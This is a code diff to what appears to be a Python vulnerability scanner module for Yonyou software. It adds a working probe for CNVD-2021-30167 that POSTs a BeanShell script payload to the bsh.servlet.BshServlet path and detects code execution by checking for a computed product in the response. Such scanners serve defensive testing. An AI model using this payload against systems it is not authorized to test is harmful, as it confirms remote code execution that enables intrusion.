@@ -26,7 +26,7 @@
 
 from lib.api.dns import dns
 from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
+from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
 from lib.tool.logger import logger
 from lib.tool.thread import thread
 from lib.tool import check
@@ -42,10 +42,12 @@ class Yonyou():
 
         self.app_name = 'Yonyou'
 
+        self.random_num_1, self.random_num_2 = random_int_2()
+
         self.cnvd_2021_30167_payloads = [
             {
                 'path': 'servlet/~ic/bsh.servlet.BshServlet',
-                'data': ''
+                'data': 'bsh.script=print%28{}*{}%29%3B'.format(self.random_num_1, self.random_num_2)
             }
         ]
 
@@ -113,7 +115,7 @@ class Yonyou():
             vul_info['target'] = target
 
             try:
-                res = requests.get(
+                res = requests.post(
                     target, 
                     timeout=self.timeout, 
                     headers=headers, 
@@ -132,7 +134,7 @@ class Yonyou():
                 logger.logging(vul_info, 'Error')
                 return None
 
-            if ('BeanShell' in res.text):
+            if (str(self.random_num_1 * self.random_num_2) in res.text):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
@@ -140,7 +142,8 @@ class Yonyou():
                     'Payload': {
                         'Url': url,
                         'Path': path
-                    }
+                    },
+                    'Request': res
                 }
                 return results
 
